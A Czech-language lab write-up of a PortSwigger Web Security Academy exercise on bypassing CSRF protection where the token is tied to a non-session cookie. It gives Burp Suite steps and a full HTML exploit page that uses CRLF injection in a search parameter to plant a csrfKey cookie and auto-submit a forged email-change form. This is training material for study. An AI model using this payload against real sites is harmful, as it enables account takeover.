# PortSwigger Lab: CSRF where token is tied to non-session cookie
 ###  📚 Studijní materiál
Tento repozitář slouží jako můj osobní studijní zápisník a přehled řešení laboratoří z platformy PortSwigger Web Security Academy.

## 📌 Popis zranitelnosti a princip
Tato laboratoř věnovaná CSRF zranitelnosti staví na tom, že server neprovazuje hodnotu `csrfKey` v cookies s konkrétní relací uživatele (`session`). Server pouze kontroluje, zda zadaný `csrf` token v těle požadavku souhlasí s hodnotou `csrfKey` v cookie.

Pomocí zranitelnosti **CRLF Injection / Cookie Injection** ve vyhledávacím poli dokážeme oběti (Carlos) vnutit náš vlastnoručně odchycený `csrfKey` a následně odeslat formulář s odpovídajícím `csrf` tokenem.

---

## 🛠️ Podrobný postup řešení (Krok za krokem)

### Krok 1: První přihlášení jako Wiener a pokus o změnu e-mailu
1. Přihlášení k účtu `wiener` (heslo: `peter`) v klasickém okně prohlížeče.
2. V nastavení účtu zadán e-mail `s0mm3r@hacker.de`.
3. V Burp Suite zapnut **Intercept on** a kliknuto na **Update email**.
4. Po zachycení požadavku kliknuto na **Drop** a **Intercept off**.
5. Na stránce se zobrazila chybová hláška (Error). Kliknuto na šipku zpět v prohlížeči, následně na **Home** a poté zpět na **My account**.
6. Zkopírována URL adresa laboratoře z adresního řádku.

### Krok 2: Odchycení tokenů Carlose v anonymním okně
1. Otevření anonymního okna prohlížeče, vložení URL a přihlášení k účtu `carlos` (heslo: `montoya`).
2. Zadán e-mail `s0mm3r@hacker.de`.
3. Zapnut **Intercept on** a kliknuto na **Update email**.
4. Zachycený požadavek odeslán do záložky **Repeater** (`Ctrl + R` / Send to Repeater).
5. Kliknuto na **Drop** a **Intercept off**.
6. Na stránce se opět zobrazil Error, kliknuto na šipku zpět, na **Home** a na **My account** (e-mail Carlose zůstal nezměněn).

### Krok 3: Testovací záměna tokenů u Wienera (Ověření zranitelnosti)
1. Přepnutí zpět do klasického okna s uživatelem `wiener`.
2. Zadán e-mail `jack@hacker.com`.
3. Zapnut **Intercept on** a kliknuto na **Update email**.
4. Přepnutí do Burp Suite:
   * Z uloženého požadavku Carlose v Repeateru zkopírována hlavička `Cookie` s `csrfKey` (řádek 3).
   * Zkopírován parametr `csrf` z těla požadavku Carlose (řádek 23).
   * Oba tyto údaje vloženy do zachyceného požadavku uživatele `wiener` (přepsán řádek 3 i řádek 23).
5. Kliknuto na **Forward** a **Intercept off**.
6. Požadavek prošel a potvrzuje, že server nekontroluje vazbu tokenů na konkrétního uživatele.

### Krok 4: Opětovné odchycení čerstvých tokenů Carlose
1. Přepnutí do anonymního okna k účtu `carlos`.
2. Opět zadán e-mail `s0mm3r@hacker.de`.
3. Zapnut **Intercept on** a kliknuto na **Update email**.
4. Požadavek opět odeslán do **Repeateru** pro získání čerstvých hodnot tokenu `csrf` a `csrfKey`.
5. Kliknuto na **Drop** a **Intercept off**.
6. Stránka hodila Error -> šipka zpět -> **Home** -> **My account**.

### Krok 5: Vygenerování HTML PoC a úprava na Exploit serveru
1. Přepnutí do klasického okna k uživateli `wiener`.
2. Zadán e-mail `mary@google.com`.
3. Kliknuto v Burp Suite na **Engagement tools** -> **Generate CSRF PoC**.
4. V záložce **Options** zaškrtnuto **Include auto-submit script**, kliknuto na **Regenerate** a následně **Copy HTML**.
5. Návrat do prohlížeče -> kliknuto na **Home** -> **Go to exploit server**.
6. Do pole **Body** vložen vygenerovaný a upravený HTML kód obsahující injektáž cookie přes vyhledávání a automatické odeslání formuláře.

---

## 📜 HTML Kód pro Exploit Server

```html
<html>
    <!-- CSRF PoC - generated & modified for non-session cookie binding -->
    <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="mary@google.com" />
        <input type="hidden" name="csrf" value="K0RGrQ7Tc9RV9IaJaCXxYDKPKwUV1tuY" />
    </form>
    <img src="https://<LAB-ID>.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=0XB3Y3eeEU7xqwECLoyqtCrdRHv6AgwS%3b%20SameSite=None" onerror="document.forms[0].submit();" />
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>

    ⚠️DŮLEŽITÉ UPOZORNĚNÍ
    Pokud by vám kód nefungoval:
Stačí si pouze vzít výše uvedený kód a upravit v něm dva hlavní parametry:

Vyměňte <LAB-ID> za vaši aktuální URL adresu z adresního řádku akademie.

Nahraďte <CARLOS_CSRF_TOKEN> a <CARLOS_CSRF_KEY> za vaše vlastní hodnoty odchycené od Carlose z Repeateru.

# 💡 Technické vysvětlení útoku

    Obcházení CSRF ochrany:
     Výsledný HTML kód po nastavení cookie automaticky odešle formulář se změnou e-mailu na mary@google.com s tokenem csrf, který k tomuto csrfKey patří. Jelikož server nekontroluje session uživatele, požadavek vyhodnotí jako platný a e-mail oběti úspěšně změní.

CRLF / Cookie Injection (<img> tag):
 Aplikace trpí zranitelností ve vyhledávacím poli (?search=). Sekvence %0d%0a vloží do HTTP odpovědi nový řádek a hlavičku Set-Cookie: csrfKey=.... Prohlížeč oběti tak nedobrovolně přijme útočníkův csrfKey.
